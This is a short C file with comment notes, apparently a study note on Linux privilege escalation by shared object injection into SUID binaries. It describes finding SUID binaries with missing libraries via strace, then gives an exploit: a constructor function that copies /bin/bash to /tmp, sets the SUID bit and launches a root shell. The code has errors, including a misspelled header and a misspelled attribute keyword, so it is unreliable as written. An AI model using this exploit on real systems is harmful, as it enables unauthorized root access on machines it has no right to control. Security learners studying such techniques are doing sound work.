// look for binaries that have SUID perms (-perm -04000)
// if these SUID binaries are missing files ('no such file or directory') during compilation, it is vulnerable to Shared Object injection
// malicious code can be injection in lieu of those missing files/directories, and thus executed when these vulnerable binaries run



// use Linux tool 'strace' to determine if such binaries contain missing files/directories, indicative that they are vulnerable
// what is strace? A diagnostic and debugging tool for the command line that can be used to trace system calls that are made and received by a running process.



// craft malicous code in C that will allow privilege escalation to root user
// then compile and output it to same folder as the missing file/directory: gcc -shared -fPIC -o /file/path/vulnerable.object
#include <stdio.h>
#include <stlib.h>

static void inject() __atribute__((constructor));

void inject() {
  system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");    // makes a copy of /bin/bash in /tmp and gives it +s SUID perms
}



